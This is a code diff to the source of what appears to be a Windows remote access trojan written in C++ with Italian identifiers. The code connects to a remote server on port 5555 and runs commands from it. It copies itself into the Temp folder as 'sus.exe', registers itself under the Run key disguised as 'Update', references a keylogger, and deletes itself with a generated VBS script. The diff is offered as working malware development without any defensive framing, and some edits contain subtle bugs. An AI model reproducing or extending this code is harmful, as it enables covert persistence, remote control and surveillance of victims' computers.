@@ -62,7 +62,6 @@ int main()
 	if(CheckPreliminari())
 		if(preliminari())
 			return 0;
-	//preliminari();
 	//InitKeylog();
 	int PORTA=5555;//RIF
 	int check=0;
@@ -82,19 +81,19 @@ int main()
 		return 0;
 	
 	Server=wcon(Client,Server);
-	thread t1(ricevi,Client);
-	thread t2(manda,Client);
 	
+	thread t1(ricevi,Client);
 	t1.detach();
-	while(true)
+	thread t2(manda,Client);
+	t2.detach();
+	
+	while(v!=-1)
 	{
 		Sleep(1000);
-		if(v==-1)
-			break;
 	}
 	
-	closesocket(Client);
 	WSACleanup();
+	Sleep(1000);
 	//system("pause");
 	return 0;
 }
@@ -240,7 +239,7 @@ void ricevi(SOCKET s)
 			if(msg[0]=='H' && msg[1]=='H')
 			{
 				cout<<"<Server> Client reset."<<endl;
-				system("start sos.exe");//3RIF
+				system("start sus.exe");//3RIF
 				closesocket(s);
 				v=-1;
 				return;
@@ -322,7 +321,13 @@ void ricevi(SOCKET s)
 				cout<<"<Server> Client delete."<<endl;
 				DelClient();
 				closesocket(s);
+				v2=false;
+				v3=false;
+				v4=false;
 				v5=false;
+				v6=false;
+				v7=false;
+				v8=false;
 				v=-1;
 				return;
 			}
@@ -621,7 +626,9 @@ void manda(SOCKET s)
 	while(true)
 	{	
 		if(v==-1)
+		{
 			return;
+		}
 		Sleep(5000);
 		if(v5)
 		if(recv(s,&c,1,MSG_PEEK)==-1)
@@ -694,14 +701,14 @@ bool preliminari()
 {
 	char buffer[MAX_PATH];
 	GetModuleFileName( NULL, buffer, MAX_PATH );
-	TCHAR szComputerName[256];
+	TCHAR szComputerName[256]={'\0'};
 	DWORD cchComputerName = 256;
-	char n[256]={'\0'};
+	char n[256]={'~'};
 	char p1[256]="\"C:\\Users\\";
-	char p2[256]="\\AppData\\Local\\Temp\\sos.exe\"";//2RIF
+	char p2[256]="\\AppData\\Local\\Temp\\sus.exe\"";//2RIF
 	char pF[256]={'\0'};
-	char pFN[256]={'\0'};
-	char cmd[256]="start ";
+	char pFC[256]={'\0'};
+	char cmd[256]="start \"\" ";
 	int c1=0;
 	int c2=0;
 	
@@ -710,36 +717,56 @@ bool preliminari()
 	{
 		if(szComputerName[i]!='\0')
 			n[i]=szComputerName[i];
-		else
+		if(szComputerName[i]=='\0' && szComputerName[i+1]!='\0')
+			n[i]=szComputerName[i];
+		if(szComputerName[i]=='\0' && szComputerName[i+1]=='\0')
+		{
+			n[i]='~';
 			i=256;
+		}
 	}
 	for(int i=0;i<100;i++)
 	{
 		pF[i]=p1[i];
-		pFN[i]=p1[i+1];
-		if(n[i]!='\0')
+		pFC[i]=p1[i+1];
+		if(n[i]!='~')
 			c1++;
+		else
+			n[i+1]='~';
 	}
 	for(int i=10;i<10+c1;i++)
-		if(i>c1)
-		{
-			pF[i]=n[i-10];
-			pFN[i-1]=n[i-10];
-		}
+	{
+		pF[i]=n[i-10];
+		pFC[i-1]=n[i-10];
+	}
 	for(int i=10+c1;i<255;i++)
 		if(p2[c2]!='\0')
 		{
 			pF[i]=p2[c2];
-			if(c2!=0)
-				pFN[i-2]=p2[c2-1];
+			if(p2[c2]!='\"')
+			pFC[i-1]=p2[c2];
 			c2++;
 		}
+	for(int i=0;i<256;i++)
+	{
+		if(pF[i]=='~')
+			pF[i]='\0';
+		if(pFC[i]=='~')
+			pFC[i]='\0';
+	}
 	
-	CopyFile(buffer,pFN,true);
+	//ShowWindow(GetConsoleWindow(), SW_SHOW);
+	//cout<<n<<endl<<pF<<endl<<pFN<<endl;
+	//system("pause");
+	
+	CopyFile(buffer,pFC,true);
 	reg_write("Software\\Microsoft\\Windows\\CurrentVersion\\Run","Update",REG_SZ,pF);
 	
-	for(int i=6;i<256;i++)
-		cmd[i]=pFN[i-6];
+	for(int i=9;i<256;i++)
+		cmd[i]=pF[i-9];
+		
+	//cout<<endl<<cmd<<endl;
+	//system("pause");
 	
 	system(cmd);
 	
@@ -911,7 +938,7 @@ void DelClient()
 	
 	char bufferEXE[MAX_PATH];
 	char bufferVBS[MAX_PATH];
-	char cmd[MAX_PATH]="start ";
+	char cmd[MAX_PATH]="start \"\" ";
 	GetModuleFileName( NULL, bufferEXE, MAX_PATH );
 	GetModuleFileName( NULL, bufferVBS, MAX_PATH );
 	
@@ -942,8 +969,19 @@ void DelClient()
 	outfile<<"WScript.Sleep 10000\ndim filesys\nSet filesys = CreateObject(\"Scripting.FileSystemObject\")\nfilesys.DeleteFile \""<<bufferEXE<<"\"\nfilesys.DeleteFile \""<<bufferVBS<<"\"\n";
 	outfile.close();
 	
-	for(int i=6;i<MAX_PATH;i++)
-		cmd[i]=bufferVBS[i-6];
+	for(int i=9;i<MAX_PATH;i++)
+	{
+		if(i==9)
+		{
+			cmd[i]='\"';
+		}
+		cmd[i+1]=bufferVBS[i-9];
+		if(cmd[i+1]=='s' && cmd[i]=='b' && cmd[i-1]=='v' && cmd[i-2]=='.')
+		{
+			cmd[i+2]=='\"';
+			i++;
+		}
+	}
 	
 	system(cmd);
 	
